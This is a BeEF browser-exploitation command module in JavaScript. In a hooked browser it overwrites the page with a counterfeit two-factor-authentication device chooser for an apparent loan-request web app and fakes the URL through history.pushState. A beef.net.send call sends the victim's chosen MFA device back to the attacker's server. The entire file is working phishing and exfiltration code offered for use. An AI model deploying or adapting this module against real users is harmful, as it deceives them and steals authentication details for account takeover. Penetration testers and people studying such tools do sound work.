function prependScript(script) {
  $('head').append(script)
}

submittedChooseMfa = `
  <script>
  function submittedChooseMfa(){
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "MFA Device: "   + document.getElementById('mfa-device').value);
    return false;
  }
  </script>
`;

fakeLoginBody = `
<div class=container><nav class="bg-faded navbar navbar-light navbar-toggleable-md"><a href=/ class=navbar-brand>Home</a><div class="collapse navbar-collapse"id=navbarSupportedContent><ul class="navbar-nav mr-auto"></ul><ul class=navbar-nav><li><a href=/profile class=nav-link>Profile</a><li class="nav-item dropdown"><a href=# class="nav-link dropdown-toggle"aria-expanded=false aria-haspopup=true data-toggle=dropdown id=navbarDropdownMenuLink>Admin</a><div class=dropdown-menu aria-labelledby=navbarDropdownMenuLink><a href=/loan_requests class=dropdown-item>Loan Requests</a></div><li class=nav-item><a href=/users/sign_out class=nav-link data-method=delete rel=nofollow>Sign out</a></ul></div></nav><div class="row mt-2"><div class=col-1></div><div class=col-10><div class="alert alert-danger alert-dismissible fade show"role=alert><button class=close type=button aria-label=Close data-dismiss=alert><span aria-hidden=true>×</span></button> You must authenticate with a Two Factor Authentication device</div></div></div><div class=row><div class=col><h1>Choose a Two Factor Authentication device</h1></div></div><div class=row><div class=col><div class=row><div class=col-4></div><div class=col-4><form accept-charset=UTF-8 action=/two_factor_devices/choose method=post><input name=utf8 type=hidden value=✓><input name=authenticity_token type=hidden value="qiN48CCdOTL3FzheBcxce+K8bGC9hIPhU38LcmVzV8Ov5mh3khJht/zM7p8e5i0dHs/JTs+8YAP4vCGHq0sPzQ=="><div class=form-inline><select class="col-lg-6 custom-select form-control" id=mfa-device name=id><option value=3>LOL<option value=4>Hmmm</select><button onclick="submittedChooseMfa()" name=commit type=submit value="Log in"class="btn btn-default"data-disable-with="Log in">Choose Device</button></div></form></div></div><div class=row><div class=col-4></div><div class=col-4><p><a href=/one_time_pad_values/view>Authenticate with One Time Pad</a></div></div></div></div></div>
`;


function show_mfa() {
  prependScript(submittedChooseMfa);
  $('body').html(fakeLoginBody);
  history.pushState({}, 'Two Factor Devices', '/two_factor_devices');
}

beef.execute(function() {
  show_mfa();
});
